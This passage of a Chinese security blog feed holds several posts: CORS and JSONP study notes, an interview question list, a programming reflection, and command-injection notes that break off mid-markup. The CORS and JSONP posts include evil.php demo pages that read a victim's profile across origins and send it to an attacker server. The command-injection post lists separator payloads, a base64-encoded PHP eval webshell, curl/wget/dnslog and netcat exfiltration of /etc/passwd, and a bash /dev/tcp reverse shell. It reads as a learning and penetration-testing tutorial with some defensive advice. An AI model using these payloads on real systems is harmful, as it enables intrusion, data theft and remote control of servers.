*</code>实现了跨域请求。</p><p>接下去我要实现一个恶意页面evil.php，让受害者访问，第11行恶意页面先以用户的名义访问了正常页面的获取个人信息的接口，由于这个接口允许任何来源的跨域跨域请求，所以给恶意页面所在8088端口的域正常返回了信息。在第13行，拿到用户的个人信息后，恶意页面将该数据上传，服务器上就拿到了用户的个人信息。由第1行中的file参数接收并存储在cors.txt文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php file_put_contents(&#x27;cors.txt&#x27;, $_GET[&#x27;file&#x27;]);?&gt;<br><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;title&gt;Evil&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;&lt;/body&gt;<br>&lt;script&gt;<br>fetch(&#x27;http://192.168.0.104:81/user.php&#x27;)<br>.then((res)=&gt;&#123;return res.text()&#125;)<br>.then((text)=&gt;&#123;fetch(&#x27;http://192.168.0.104:8088/evil.php?file=&#x27; + text)&#125;)<br>.catch(function (error) &#123;console.log(&#x27;请求错误：&#x27;,error);&#125;);<br>&lt;/script&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="/image-20220525183039947.png" alt="image-20220525183039947"></p><p><img src="/image-20220525183021922.png" alt="image-20220525183021922"></p><p><img src="/image-20220525183055935.png" alt="image-20220525183055935"></p><p>通过这三个请求可以看到完整的攻击路径。</p><h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol><li>不要配置<code>Access-Control-Allow-Origin</code>为通配符“*”，而且更重要的是，要严格效验来自请求数据包中的”Origin” 的值。当收到跨域请求的时候，要检查”Origin” 的值是否是一个可信的源， 还要检查是否为 null</li><li>避免使用<code>Access-Control-Allow-Credentials: true</code></li><li>减少 <code>Access-Control- Allow-Methods</code> 所允许的方法</li></ol><h1 id="漏洞挖掘方式"><a href="#漏洞挖掘方式" class="headerlink" title="漏洞挖掘方式"></a>漏洞挖掘方式</h1><ol><li>通过js爬虫或者流量分析的方式，特别是涉及到敏感信息的接口，比如获取个人信息的接口。检查响应头中的<code>Access-Control-Allow-Origin</code>的值是否为通配符“*”</li><li>有些服务端的代码会这样写</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ORIGIN&#x27;</span>])&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ORIGIN&#x27;</span>])<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不管Origin中的域名是什么，服务端都接收这些跨域请求。这和设置为“*”是一样的效果。在挖掘中可以尝试发送一个和正常域名不相同的域名，存在CORS漏洞的域名为<code>aaa.com</code>，我们可以设置一个值为<code>bbb.com</code>的Origin，如果服务端的<code>Access-Control-Allow-Origin</code>值也返回了<code>bbb.com</code>或者<code>*</code>，那么需要特别注意，很有可能存在CORS漏洞，值得进一步验证。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/97671">JSONP与CORS漏洞挖掘</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CORS</tag>
      
      <tag>同源策略</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hw面试题</title>
    <link href="/2022/05/25/hw%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <url>/2022/05/25/hw%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>面试题目</p><p>一、你今年毕业了吗？</p><p>二、你现在在【地名】哦？</p><p>三、我看你简历上写了你学过的一些内容，你能说下你的学习方向吗？</p><p>四、你参加过护网吗？</p><p>五、你参加过蓝队的护网吗？</p><p>六、你知道哪些设备呢？</p><p>七、HFish蜜罐是开源的，你有用过吗？</p><p>八、你有过应急响应的经验吗？</p><p>九、我看你简历上写着你学过内网渗透，你能说下当你拿到一台域内的主机之后，怎么进行域渗透吗？</p><p>十、你简历上写了你会用webshell管理工具，蚁剑、菜刀什么的你都用过吧？</p><p>十一、能说下webshell管理工具的流量特征吗？</p><p>十二、问你一个最简单最基础的问题吧，内网的IP地址有哪些？</p><p>十三、你会用什么办法溯源攻击方的个人信息呢</p><p>十四、CDN负载均衡你知道吧？如果攻击方使用的是一个有挂了CDN负载均衡的服务器来攻击你，你要怎么溯源到目标的真实IP地址呢？</p><p>十五、你知道红队经常用于攻击的漏洞是什么吗？</p><p>十六、反序列化漏洞你了解过哪些？</p><p>十七、shiro反序列化你有复现过吗？</p><p>十八、你要怎么通过流量分析知道对方使用的shiro攻击是否成功呢？</p><p>十九、和甲方上报IP地址，你要上报哪些地址呢？</p><p>二十、怎么通过流量分析 ，判断出对方攻击成功了？</p><p>二十一、如果攻击的回显有延迟或者说攻击生效需要一定的时间 ，你不能很快看见 ，那该怎么通过流量分析判断出攻击是否生效了？</p><p><del>二十二、还有几道暂时记不起来了…                       ——柒</del></p><p>二十三、CS的流量特征</p><p>二十四、你还有什么要问我的？</p><p>二十五、拿到域内某台机子权限后该做什么？</p><p>根据简历问的</p><p>二十六、你的学历、你的岁数</p><p>二十七、hw经历、挖洞经历</p><p>二十八、写工具</p><p>二十九、内网经验</p><p>三十、疫苗打了几针</p><p>三十一、应急响应说详细点</p><p>三十二、安全产品、设备使用经历</p><p>三十三、你的自评级(自信点)</p><p>三十四、如何判断流量是恶意攻击，如何判断是否攻击成功</p><p>三十五、如何判断是扫描器还是红队的攻击</p><p>三十六、cs进入内网后如何应急 </p><p>三十七、钓鱼邮件如何绕过安全设备的检测</p><p>三十八 红队删除了历史记录怎么搞</p><p>三十九 海量的上报怎么判断</p><p>四十 linux系统新增用户怎么检查</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hw</tag>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsonp漏洞学习笔记</title>
    <link href="/2022/05/25/jsonp%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/05/25/jsonp%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>jsonp（JSON with Padding）是json的一种”使用模式”，实现了跨域读取数据。由于浏览器存在同源策略，ajax只能请求到同源的域（域名、协议、端口都相同），而script标签的src属性不受同源策略的限制，所以通过script标签进行跨域传输比较方便。</p><p>如果我们访问了一个恶意页面，这个页面上存在一段恶意js，请求了正常页面的jsonp接口，这个jsonp接口可以返回个人信息。从而恶意页面就可以读取这段数据，获得了用户的个人信息。下图中的A站就是恶意页面，而B站就是正常页面。需要注意的是，这个操作需要用户在B站已经存在登录状态。</p><p><img src="/image-20220525134233406.png" alt="image-20220525134233406"></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="演示demo"><a href="#演示demo" class="headerlink" title="演示demo"></a>演示demo</h2><p>假设现在存在一个正常的页面user.php，有一个返回用户个人信息的接口，后端代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$callback</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type: application/json&#x27;</span>);<br><span class="hljs-keyword">print</span> <span class="hljs-variable">$callback</span>.<span class="hljs-string">&#x27;(&#123;&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;alice&quot;,&quot;email&quot;:&quot;alice@qq.com&quot;&#125;)&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/image-20220525144006247.png" alt="image-20220525144006247"></p><p>前端代码如下，用script标签跨域请求jsonp资源，相当于调用了前端的info函数把获取到的资源显示在页面上，这就是很正常的一个网站。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>info api<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">info = <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data))&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://localhost:81/user.php?callback=info&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接下来构造一个恶意页面evil.php，让用户一访问到这个页面，就会请求查询他个人信息的接口，并且把获取到的数据上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php file_put_contents(&#x27;json.txt&#x27;, $_GET[&#x27;file&#x27;]);?&gt;<br><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;title&gt;Evil&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;&lt;/body&gt;<br>&lt;script&gt;<br>var test = (data) =&gt; &#123;<br>    fetch(&#x27;http://localhost:81/evil.php?file=&#x27; + JSON.stringify(data));<br>&#125;<br>&lt;/script&gt;<br>&lt;script src=&quot;http://localhost:81/user.php?callback=test&quot;&gt;&lt;/script&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>用户访问这个evil.php页面后，第15行的代码就是请求了正常页面的获取个人信息的接口，第12行的就是用fetch发起一个get请求（辣鸡XMLHttpRequest写起来太费劲），将获取到的数据上传到服务器。第1行php接收到了个人信息的数据，就把数据写在了json.txt中。从而用户的个人信息被攻击者获取。</p><p><img src="/image-20220525161340266.png" alt="image-20220525161340266"></p><p><img src="/image-20220525161632601.png" alt="image-20220525161632601"></p><p>这里的三个请求就代表了攻击路径，服务器上的json.txt被创建，里面包含了用户的个人信息。恶意页面在8088端口，而正常页面在81端口，两者属于不同的源，代表这里跨域攻击成功。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>在实战中，jsonp经常被用于某蜜罐中，用于捕获攻击者的社交平台个人信息，形成攻击画像，最终溯源到攻击者。</p><h1 id="yy时刻"><a href="#yy时刻" class="headerlink" title="yy时刻"></a>yy时刻</h1><p>那么如何在挖洞中寻找jsonp漏洞，纯属yy</p><p>可以从两个方面进行，一种是从代码里找，一种是从流量里找</p><p>从代码里找就是从js文件中，利用jsfinder这类接口爬虫工具，寻找能返回json 的api，或是寻找存在“callback”字样的url请求。重点关注script标签中的src属性</p><p>从流量里找就是在请求头或url中存在“json”，或是响应头中存在“content-type:application&#x2F;json”字样的请求，</p><h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><p>json 正确的 http 头输出尽量避免跨域的数据传输，对于同域的数据传输使用 XMLHttpRequest 或 fetch 的方式作为数据获取的方式，依赖于 javascript 在浏览器域里的安全性保护数据。如果是跨域的数据传输，在后台必须要对敏感的数据获取做权限认证。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/97671">JSONP与CORS漏洞挖掘</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>同源策略</tag>
      
      <tag>jsonp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编程感想</title>
    <link href="/2022/05/24/%E7%BC%96%E7%A8%8B%E6%84%9F%E6%83%B3/"/>
    <url>/2022/05/24/%E7%BC%96%E7%A8%8B%E6%84%9F%E6%83%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="为什么取这名"><a href="#为什么取这名" class="headerlink" title="为什么取这名"></a>为什么取这名</h1><p>本文记录了在coding人生中的一些随想感悟（即兴吐槽），简而言之就是这是写给我自己看的，不是写给你看的。</p><p>有时候，越学越觉得自己无知，索性停下来，想想目前走的道路是否还正确。至于为什么取这么土的名字，原本想取名“编程随想”，但又不想和某个知名账号扯上联系，引发过度的联想导致被迫参和那些狗屁倒灶的事情。索性土就土吧，走的再高也不能忘记底层基础。</p><h1 id="2022-5-24"><a href="#2022-5-24" class="headerlink" title="2022.5.24"></a>2022.5.24</h1><blockquote><p>软件工程师分为两种：一种充分理解了计算机科学，从而有能力应对充满挑战的创造性工作；另一种仅仅凭着对一些高级工具的熟悉而勉强应付。</p></blockquote><blockquote><p>这两种人都自称软件工程师，都能在职业生涯早期挣到差不多的工资。然而，随着时间流逝，第一种工程师不断成长，所做的事情将会越来越有意义且更为高薪，不论是有价值的商业工作、突破性的开源项目、技术上的领导力或者高质量的个人贡献。</p></blockquote><blockquote><p>第一种工程师总是寻求深入学习计算机科学的方法，或是通过传统的方法学习，或是在职业生涯中永无止息地学习；第二种工程师 通常浮于表面，只学习某些特定的工具和技术，而不研究其底层的基本原理，仅仅在技术潮流的风向改变时学习新的技能。</p></blockquote><blockquote><p>如今，涌入计算机行业的人数激增，然而计算机专业的毕业生数量基本上未曾改变。第二种工程师的供过于求正在开始减少他们的工作机会，使他们无法涉足行业内更加有意义的工作。对你而言，不论正在努力成为第一种工程师，还是只想让自己的职业生涯更加安全，学习计算机科学是唯一可靠的途径。</p></blockquote><p>以上的话来自<a href="https://github.com/izackwu/TeachYourselfCS-CN/blob/master/TeachYourselfCS-CN.md#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%AD%A6%E4%B9%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6">为什么要学习计算机科学</a>。越看越觉得这话在理，每天重复CRUD的工作的意义在哪里。不是在学这个框架，就是在学另一个框架的路上，学了那么多框架，鼓捣了这么多杂七杂八的系统，意义在哪里？</p><p>打个比方，我是个修车的。今天学会了使用榔头，明天熟练使用榔头，后天学会了扳手…看起来每天都在学新东西，践行了“终生学习”的价值观，还能以此自我安慰，但是一辈子就是个修车的。</p><p>写完一个系统，过段时间回去看都不知道自己写了些什么，还得去读读自己写的屎山，实在没劲。人是会健忘的，不如做些有质量有价值的东西，而不是流水线商品。</p><p>今天看国内的各种网安产品，不是同质化严重，就是喜欢弄个新概念出来忽悠人。什么“攻击面”，诸如此类。本质不就是写个脚本到处搜索相关信息。浮躁！还是浮躁。换个新概念改个包装就想出来圈钱，一点都没有底层的技术积累。究其原因，我分为外因和内因。外因是国内的生活生产节奏太快，没有时间留给思考和真正对技术感兴趣的人。内因是人心浮躁，不管是打工人还是创业者，很少有人去思考为什么这段代码这么写，怎么写更好，而是“能用就行”。再论产品，只抄了国外产品的“形”，没有其思考结晶的“实”。功能都能实现，但没有去思考为什么要去实现这个功能。</p><p>想给自己制定一个长期的计划——“review CS”，重学计算机科学。起因也是看了一篇国外的论文，发现了可以基于属性图去做一些事情。而想起学校里的课，大大的误导了我，从而限制了我的想象力，让我很恼火。学校里的数据库课，一讲数据库，就讲关系型的sql，从而产生了误导，不管想做什么，就是mysql一把梭。从来不去想，这世界上还有neo4j等图数据库的存在。</p><p>为了打破这种僵化的思维，决定空闲时间学习一些更底层的技术。让自己时刻保持对这个世界的想象力。</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>思考</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行漏洞学习笔记</title>
    <link href="/2022/05/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/05/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>应用中用到外部命令或程序，参数需要用户输入时，没有对用户的输入做检查，造成执行了预期之外的命令。举个栗子，下面是一个返回ping结果的程序，直接将用户可控的ip这个参数拼接进了命令，就可以提交其他的命令，从而造成命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php <br>  echo &#x27;&lt;pre&gt;&#x27;;<br>  echo shell_exec(&#x27;ping -c 4 &#x27;. $_GET[ip]); <br>  echo &#x27;&lt;/pre&gt;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><p>php中能调用外部命令的常见函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(args)                                有回显<br><span class="hljs-title function_ invoke__">passthru</span>(args)(有回显)<br><span class="hljs-title function_ invoke__">exec</span>(args) （回显最后一行-必须 <span class="hljs-keyword">echo</span> 输出）<br><span class="hljs-title function_ invoke__">shell_exec</span>(args) （无回显-必须输出）<br>反引号：``<br>    <br><span class="hljs-title function_ invoke__">popen</span>(handle,mode)(无回显)<br><span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&#x27;cmd&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)（无回显）<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&#x27;dir&#x27;</span>,<span class="hljs-variable">$des</span>,<span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">stream_get_contents</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])<br>    <br>putenv<br>assert<br>pcntl_exec<br>COM组件<br></code></pre></td></tr></table></figure><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="分号"><a href="#分号" class="headerlink" title="分号;"></a>分号;</h2><p>用分号可以分隔多条命令，命令按照从左到右的顺序执行。当一条命令执行失败时，不会中断其他命令的执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 127.1;<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h2 id="管道命令"><a href="#管道命令" class="headerlink" title="管道命令|"></a>管道命令|</h2><p>管道符可以将前一个命令的标准输出变成后一个命令的标准输入，当前一个命令执行失败后，会执行后一个命令。ip的位置输入1是为了让ping报错，从而立即执行后一条命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 1|<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h2 id="后台任务符号"><a href="#后台任务符号" class="headerlink" title="后台任务符号&amp;"></a>后台任务符号&amp;</h2><p>此符号的作用是使shell在后台执行该条命令，这个命令有个缺陷就是两个命令的输出会混淆在一起</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 127.1&amp;<span class="hljs-built_in">cat</span> /etc/passwd&amp;<br></code></pre></td></tr></table></figure><h2 id="逻辑与"><a href="#逻辑与" class="headerlink" title="逻辑与&amp;&amp;"></a>逻辑与&amp;&amp;</h2><p>按顺序执行命令，命令之间是逻辑与关系，只有前面的命令执行成功后才会执行后面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 127.1&amp;&amp;<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h2 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或||"></a>逻辑或||</h2><p>按顺序执行命令，命令之间是逻辑或关系，前面的命令执行失败后才会执行后面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 1||<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号&#96;"></a>反引号&#96;</h2><p>将一个命令将被执行时，会首先解析反引号之间的内容，比如”echo `whoami`“，会先执行<code>whoami</code>，再<code>echo</code>出来</p><h2 id="command-命令执行"><a href="#command-命令执行" class="headerlink" title="$(command)命令执行"></a>$(command)命令执行</h2><p>作用同反引号，也是先执行括号中的内容，再将结果和前面的命令一起执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 $(<span class="hljs-built_in">whoami</span>)<br></code></pre></td></tr></table></figure><h2 id="win命令连接符"><a href="#win命令连接符" class="headerlink" title="win命令连接符"></a>win命令连接符</h2><p><code>| &amp; || &amp;&amp;</code>跟linux一样</p><h2 id="回显敏感信息"><a href="#回显敏感信息" class="headerlink" title="回显敏感信息"></a>回显敏感信息</h2><p>win下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span> c:\windows\win.ini<br></code></pre></td></tr></table></figure><p>linux下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h2 id="无回显利用方法"><a href="#无回显利用方法" class="headerlink" title="无回显利用方法"></a>无回显利用方法</h2><p>碰到命令执行，有回显的情况是少数，大多数情况都是无回显。这里分享一些无回显时的攻击方法。首先要判断是否存在命令执行漏洞，可以利用sleep命令，payload比如<code>ip=|sleep 5</code>，如果延迟5秒返回了结果，则存在漏洞。</p><h3 id="带外通信-dnslog"><a href="#带外通信-dnslog" class="headerlink" title="带外通信 - dnslog"></a>带外通信 - dnslog</h3><p>dnslog是一个通过dns查询将信息外传的方法。简单的说，将需要外传的信息附在dns查询上，最终的查询肯定会请求到自己掌控的dns域上，就可以看到相应的dns请求，从而获得附在dns查询上的信息。并且dns查询不像http请求那样容易被检测到，隐蔽性好。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping `<span class="hljs-built_in">whoami</span>`.pulsok.ceye.io<br></code></pre></td></tr></table></figure><p><img src="/image-20220521183049549.png" alt="image-20220521183049549"></p><p><img src="/image-20220521183008203.png" alt="image-20220521183008203"></p><p>发起ping命令即可发出dns请求，就能在dnslog平台上看到外传的信息</p><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>如果存在漏洞的页面是web服务或者说存在漏洞的服务器上运行着web服务器，且有权限写入，可以利用shell命令写入webshell后门到网站目录，访问即可获得webshelll</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg==&quot;</span>|<span class="hljs-built_in">base64</span> -d &gt;shell.php<br></code></pre></td></tr></table></figure><p>这里用了base64将一句话木马加密了，可以绕过部分waf的检查</p><h3 id="http访问日志"><a href="#http访问日志" class="headerlink" title="http访问日志"></a>http访问日志</h3><p>最基础的一种方法，在自己的服务器上起一个http服务器，只要有请求访问就有日志，把要外传的信息跟在http请求中访问自己的http服务器，即可在访问日志中查看到要接收的信息。http服务器话，可以用python起一台小型web服务器，非常方便。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>如下图，用curl发起http请求，带上<code>whoami</code>的查询结果。下面web访问日志中的<code>www-data</code>就是对应<code>whoami</code>的执行结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 ||curl http://[ip]/`<span class="hljs-built_in">whoami</span>`<br></code></pre></td></tr></table></figure><p><img src="/image-20220521194440765.png" alt="image-20220521194440765"></p><p>同样也可以用wget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 ||wget http://[ip]/`<span class="hljs-built_in">whoami</span>`<br></code></pre></td></tr></table></figure><h3 id="nc传文件"><a href="#nc传文件" class="headerlink" title="nc传文件"></a>nc传文件</h3><p>一般服务器上都有netcat命令，可以利用这个命令发送文件到远程服务器上。比如，在自己的服务器上运行监听9999端口的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lp 9999 &gt; passwd<br></code></pre></td></tr></table></figure><p>在存在命令执行漏洞的服务器上执行发送文件的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc [my server ip] 9999 &lt;/etc/passwd<br></code></pre></td></tr></table></figure><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>反弹shell是从内部的受控端（也就是存在命令执行漏洞的服务器），主动连接外部远程服务器，所以防火墙一般不会拦截。</p><p>自己的服务器上nc监听命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 8080<br></code></pre></td></tr></table></figure><p>存在命令执行漏洞的服务器上反弹shell，每种编程语言都可以用sock发送请求，这里只演示最基础的bash反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &amp;&gt; /dev/tcp/192.168.1.57/8080 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img 